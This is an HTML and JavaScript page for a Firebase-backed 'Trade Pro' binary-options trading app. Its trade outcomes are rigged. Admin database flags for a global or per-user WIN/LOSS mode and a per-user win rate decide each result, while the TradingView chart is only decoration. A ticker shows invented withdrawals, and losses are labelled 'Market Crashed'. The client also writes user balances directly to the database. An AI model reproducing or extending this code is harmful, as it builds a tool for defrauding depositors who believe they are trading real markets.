<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade Pro - Elite Edition</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { 
            --bg: #0b0e11; --card: #1e2329; --yellow: #fcd535; --green: #0ecb81; --red: #f6465d; 
            --text: #eaecef; --glass: rgba(255, 255, 255, 0.05);
        }

        body { 
            background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; 
            margin: 0; padding: 0; overflow: hidden;
        }
        
        .ticker-wrap { width: 100%; overflow: hidden; background: #181a20; border-bottom: 1px solid #2b2f36; height: 30px; display: flex; align-items: center; }
        .ticker { white-space: nowrap; animation: ticker 30s linear infinite; font-size: 10px; color: #848e9c; text-transform: uppercase; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; background: var(--card); }
        .symbol-badge { background: rgba(252, 213, 53, 0.1); color: var(--yellow); padding: 4px 10px; border-radius: 6px; font-weight: 800; }
        
        #chart-container { height: 400px; width: 100%; position: relative; background: #000; }
        
        /* Control Panel */
        .controls { padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: var(--card); border-top-left-radius: 30px; border-top-right-radius: 30px; position: fixed; bottom: 0; width: 100%; box-sizing: border-box; }
        .trade-btn { border: none; padding: 18px; border-radius: 15px; font-weight: 900; font-size: 18px; color: #fff; cursor: pointer; transition: 0.2s; }
        .btn-up { background: var(--green); box-shadow: 0 5px 15px rgba(14, 203, 129, 0.3); }
        .btn-down { background: var(--red); box-shadow: 0 5px 15px rgba(246, 70, 93, 0.3); }
        
        /* Result Popup */
        #result-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .res-card { padding: 40px; border-radius: 28px; text-align: center; width: 280px; transition: 0.3s; }
        .res-win { background: linear-gradient(145deg, #0ecb81, #0a9d63); }
        .res-loss { background: linear-gradient(145deg, #f6465d, #c33043); }
        
        .timer-overlay { position: absolute; top: 10px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.5); padding: 5px 15px; border-radius: 20px; font-weight: bold; color: var(--yellow); border: 1px solid var(--yellow); display: none; }
    </style>
</head>
<body>

<div class="ticker-wrap">
    <div class="ticker">
        <span>BTC/USDT +2.45%</span> <span>User Malik_77 Withdrew $450</span> <span>ETH/USDT -1.12%</span> <span>New VIP Signal: BUY BTC</span>
    </div>
</div>

<div class="top-bar">
    <div class="symbol-badge">BTC/USDT ⚡</div>
    <div class="balance-box">Wallet: <span id="top-bal">$0.00</span></div>
</div>

<div id="chart-container">
    <div class="timer-overlay" id="trade-timer">00:60</div>
    <iframe id="tradingview_chart" src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_76292&symbol=BINANCE%3ABTCUSDT&interval=1&hidesidetoolbar=1&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=%5B%5D&theme=dark&style=1&timezone=Etc%2FUTC" width="100%" height="100%" frameborder="0" allowtransparency="true" scrolling="no" allowfullscreen></iframe>
</div>

<div class="controls">
    <input type="number" id="trade-amount" placeholder="Amount ($)" style="grid-column: span 2; padding: 12px; border-radius: 10px; border: 1px solid #474d57; background: #2b3139; color: white;">
    <button class="trade-btn btn-up" onclick="startTrade('BUY')">CALL (UP)</button>
    <button class="trade-btn btn-down" onclick="startTrade('SELL')">PUT (DOWN)</button>
</div>

<div id="result-popup">
    <div class="res-card" id="res-card">
        <h1 id="res-status">WIN</h1>
        <p id="res-msg">Profit: +$0.00</p>
        <button onclick="location.reload()" style="margin-top:20px; padding:10px 20px; border-radius:10px; border:none; background:#fff; color:#000; font-weight:bold;">DONE</button>
    </div>
</div>

<script>
    const firebaseConfig = { 
        apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", 
        authDomain: "trade-for-profit-8b160.firebaseapp.com", 
        databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", 
        projectId: "trade-for-profit-8b160", 
        storageBucket: "trade-for-profit-8b160.firebasestorage.app", 
        messagingSenderId: "1077014018991", 
        appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" 
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.database();

    let currentBalance = 0;

    auth.onAuthStateChanged(user => {
        if (user) {
            db.ref('users/' + user.uid).on('value', snap => {
                const data = snap.val();
                currentBalance = data.balance;
                document.getElementById('top-bal').innerText = "$" + currentBalance.toFixed(2);
            });
        } else {
            window.location.href = "login.html";
        }
    });

    function startTrade(type) {
        const amt = parseFloat(document.getElementById('trade-amount').value);
        if (!amt || amt > currentBalance || amt < 1) {
            alert("Invalid Amount!");
            return;
        }

        // Lock Buttons
        document.querySelectorAll('.trade-btn').forEach(b => b.disabled = true);
        document.getElementById('trade-timer').style.display = 'block';
        
        let timeLeft = 60;
        const timerInt = setInterval(() => {
            timeLeft--;
            document.getElementById('trade-timer').innerText = "00:" + (timeLeft < 10 ? "0" + timeLeft : timeLeft);
            if (timeLeft <= 0) {
                clearInterval(timerInt);
                processResult(amt, type);
            }
        }, 1000);
    }

    function processResult(amt, type) {
        const uid = auth.currentUser.uid;
        
        // Admin Controls Fetching
        const globalRef = db.ref('settings/globalControl');
        const userRef = db.ref('users/' + uid);

        Promise.all([globalRef.get(), userRef.get()]).then(results => {
            const globalMode = results[0].val() || "NORMAL";
            const userData = results[1].val();
            const manualControl = userData.control || "NORMAL";
            const winRate = userData.winRate || 50;

            let isWin = false;

            // Logic Tree
            if (globalMode === "WIN") isWin = true;
            else if (globalMode === "LOSS") isWin = false;
            else if (manualControl === "WIN") isWin = true;
            else if (manualControl === "LOSS") isWin = false;
            else {
                isWin = Math.floor(Math.random() * 100) < winRate;
            }

            // Calculations
            const profit = isWin ? (amt * 1.85) : 0;
            const newBal = (currentBalance - amt) + profit;

            // Show Result
            document.getElementById('result-popup').style.display = 'flex';
            const card = document.getElementById('res-card');
            
            if (isWin) {
                card.className = "res-card res-win";
                document.getElementById('res-status').innerText = "WIN";
                document.getElementById('res-msg').innerText = "Profit Received: +$" + (amt * 0.85).toFixed(2);
            } else {
                card.className = "res-card res-loss";
                document.getElementById('res-status').innerText = "LOSS";
                document.getElementById('res-msg').innerText = "Market Crashed: -$" + amt;
            }

            // Sync with Firebase
            db.ref('users/' + uid).update({ 
                balance: newBal,
                control: "NORMAL" // Reset manual control
            });
        });
    }
</script>

</body>
    </html>
